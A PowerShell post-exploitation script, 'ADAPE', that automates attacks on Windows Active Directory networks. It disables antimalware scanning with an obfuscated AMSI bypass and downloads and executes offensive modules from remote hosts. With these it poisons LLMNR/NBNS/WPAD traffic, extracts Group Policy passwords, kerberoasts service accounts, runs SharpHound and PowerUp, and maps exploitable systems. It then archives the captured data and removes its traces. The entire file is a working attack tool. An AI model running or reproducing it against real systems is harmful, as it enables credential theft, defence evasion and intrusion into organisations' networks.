[CmdletBinding()]
Param(
      [Int]$threads=20,
      [Parameter(Mandatory=$false)][switch]$Inv=$false,
      [Parameter(Mandatory=$false)][switch]$GPP=$false,
      [Parameter(Mandatory=$false)][switch]$Kerberoast=$false,
      [Parameter(Mandatory=$false)][switch]$Bloodhound=$false,
      [Parameter(Mandatory=$false)][switch]$PrivEsc=$false,
      [Parameter(Mandatory=$false)][switch]$PView=$false,
      [Parameter(Mandatory=$false)][switch]$All=$false
    )
Write-Host '
    ______   _______    ______   _______   ________ 
   /      \ |       \  /      \ |       \ |        \
  |  $$$$$$\| $$$$$$$\|  $$$$$$\| $$$$$$$\| $$$$$$$$
  | $$__| $$| $$  | $$| $$__| $$| $$__/ $$| $$__    
  | $$    $$| $$  | $$| $$    $$| $$    $$| $$  \   
  | $$$$$$$$| $$  | $$| $$$$$$$$| $$$$$$$ | $$$$$   
  | $$  | $$| $$__/ $$| $$  | $$| $$      | $$_____ 
  | $$  | $$| $$    $$| $$  | $$| $$      | $$     \
   \$$   \$$ \$$$$$$$  \$$   \$$ \$$       \$$$$$$$$
   ' -ForegroundColor Magenta

Write-Host  '
  #############################################################
  #                                                           #
  #   Active Directory And Privilege Escalation Script v3.0   #
  #                                                           #
  #   Developed By @Haus3c                                    #
  #                                                           #
  #############################################################' -ForegroundColor Green

<# 
.SYNOPSIS
    The purpose of this script is to run a few different things during the post-exploitation phase without having to port over multiple scripts. I didn't make the scripts used in this module, I'm not that smart. I just put it all together.
    Author: @haus3c
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER Inv
    Runs the Inveigh function. Responds to LLMNR, NBNS, and WPAD broadcasts for 5 minutes by default. Credit: @Kevin_Robertson.

.PARAMETER GPP
    Runs the Group Policy Preferences function. Searches for local admin passwords in the SYSVOL share of DCs. Credit: @obscuresec

.PARAMETER Kerberoast
    Runs the Kerberoast function. Queries for SPNs and their TGTs. Default storage is in Hashcat format because Hashcat>JtR. Credit: @TimMedin and @harmj0y

.PARAMETER Bloodhound
    Runs the Bloodhound function which runs the Powershell 'sharphound' datacollector. Speed is optimized over stealth by default. Credit: @cptjesus, @wald0, @harmj0y

.PARAMETER PrivEsc
    Runs the PrivEsc function which is running All Checks via the Power Up script. Credit: @harmj0y

.PARAMETER PView
    Runs the Power view module. The full module is included so add whatever arguments you want in the function. By default it's looking for looking for open shares, sensitive files, exploitable systems, and domain policy. Credit: @mattifestation @harmj0y

.PARAMETER All
    Does all of the above

.EXAMPLE
    Set-ExecutionPolicy Bypass ./ADAPE.ps1 -All

.EXAMPLE
    Set-ExecutionPolicy Bypass ./ADAPE.ps1 -Inv -GPP -Kerberoast

#>

Set-ExecutionPolicy Unrestricted
#amsi bypass, disable if you think this will get you caught.
[ScriptBlock].Assembly.GetType('System.Management.Automation.Am'+'siUtils')."GetF`ield"('am'+'siInitFailed','NonP'+'ublic,Static').SetValue($null,$true)
#Admin Check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
    Write-Host "NOT running as Administrator; only Bloodhound+PrivEsc+Kerberoast modules enabled."
}
$ErrorActionPreference= 'silentlycontinue'
$directory = pwd
$path = $directory.path + "\Capture"
$zip = $directory.path + "\Captured"
#OSCheck 
$OS=(Get-WMIObject win32_operatingsystem).name
$version = $OS.Substring(0, $OS.IndexOf("|"))
New-Item -ItemType Directory -Force -Path $path | Out-Null
Write-Host "Capture folder located at $path" -ForegroundColor Green
Write-Host "OS Detected: $version"
If( $OS -match "10" -or
$OS -match "2012" -or
$OS -match "2016" -or
$OS -match "8")
{
Write-Host "OS Detected: $version"
}
	
#Inveigh
function Inveigh
{
    New-Item -ItemType File -Force $path/Inv.psm1  | Out-Null
    $Inveigh = iwr -uri https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
    [System.IO.File]::WriteAllText("$path/Inv.psm1", $Inveigh.content)
    Import-Module $path/Inv.psm1
	rm $path/Inv.psm1
    Write-Host "Attemping WPAD, LLMNR, and NBTNS poisoning" -ForegroundColor Yellow
    Invoke-Inveigh -ConsoleOutput N -NBNS Y -mDNS Y -HTTPS Y -FileOutput Y -FileOutputDirectory $path -RunTime 5
}

#GPP
function GPP
{
    $GPPP = iwr -uri https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1
    Write-Host "Checking for GPP Passwords" -ForegroundColor Yellow
	[System.IO.File]::WriteAllText("$path/GPP.ps1", $GPPP.content)
	Import-Module $path/GPP.ps1
	rm $path/GPP.ps1
	Get-GPPPassword
}
#Kerberoast
function Kerberoast
{
    $Kerb = iwr -uri https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
    Write-Host "Kerberoasting" -ForegroundColor  Yellow
	[System.IO.File]::WriteAllText("$path/Kerb.ps1", $Kerb.content)
	Import-Module $path/Kerb.ps1
	rm $path/Kerb.ps1
	Invoke-Kerberoast
}
#Sharphound
function Bloodhound
{
	New-Item -ItemType Directory -Force -Path $path | Out-Null
	$directory = pwd
	$path = $directory.path + "\Capture"
    Write-Host "Sniffy boi sniffin" -ForegroundColor Yellow
    $spath = $path + "\sharp.exe"
    $sharp = iwr -uri https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe?raw=true
    Set-Content $spath -Value $sharp.content -Encoding Byte -Force
	Start-Process $spath
}
#PrivEsc
function PrivEsc
{
	$PrivEsc= iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
    Write-Host "Collecting Privesc methods..." -ForegroundColor  Yellow
	[System.IO.File]::WriteAllText("$path/PrivEsc.psm1", $PrivEsc.content)
	Import-Module $path/PrivEsc.psm1
	rm $path/PrivEsc.psm1
	Invoke-AllChecks | Out-File $path\PrivEsc.txt
}
#PowahView
function PView
{
	$PView= iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
	[System.IO.File]::WriteAllText("$path/PView.psm1", $PView.content)
	Import-Module $path/PView.psm1
	rm $path/PView.psm1
	Invoke-ShareFinder -CheckShareAccess -Threads 80 | Out-File $path\ShareFinder.txt
	Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
	Get-NetFileServer | Out-File $path\FileServers.txt
	net share | Out-File $path\NetShare.txt
	Get-DomainPolicy | Out-File $path\DomainPolicy.txt	
	Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
	Write-Host "Searching for file servers..." -ForegroundColor Yellow
	Write-Host "Checking for attached shares..." -ForegroundColor Yellow
	Write-Host "Grabbing Domain Policy..." -ForegroundColor Yellow

}
If ($Inv) {
    Inveigh
}

If ($GPP) {
    GPP
}
If ($Kerberoast){
    Kerberoast
}

If ($Bloodhound) {
    Bloodhound
}

If ($PrivEsc) {
    PrivEsc
}

If ($PView) {
    PView
}

If ($All) {
    Inveigh
    GPP
    Kerberoast
    Bloodhound
    PrivEsc
    PView
}
#Zip it all up and remove leftovers

Stop-Inveigh
If($PSVersionTable.PsVersion.Major -lt 5)
{
	Remove-Item -Recurse -Force $path + "\Inv.psm1"
	Remove-Item -Recurse -Force $path + "\sharp.exe"
    Write-Host "Not running PS5, cannot zip folder. Do it yoself."
    Write-Host "Done!"
}
else 
{
	Remove-Item -Recurse -Force $path + "\Inv.psm1"
	Remove-Item -Recurse -Force $path + "\sharp.exe"
    Compress-Archive -Force -Path $path -DestinationPath $zip
    Remove-Item -Recurse -Force $path
    Write-Host "Done! Results stored in the Captured.zip file!" -ForegroundColor Green	
}
